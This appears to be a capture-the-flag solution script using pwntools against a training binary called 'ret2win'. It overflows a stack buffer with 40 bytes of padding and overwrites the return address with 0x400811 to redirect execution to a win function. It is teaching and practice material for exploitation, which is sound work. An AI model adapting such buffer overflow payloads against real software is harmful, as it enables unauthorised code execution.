# -*- coding: utf-8 -*-
from pwn import *
p = process('./ret2win')
p.recvuntil("> ")
win = 0x400811
payload = "a" * 40 + p64(win)
p.sendline(payload)
p.interactive()


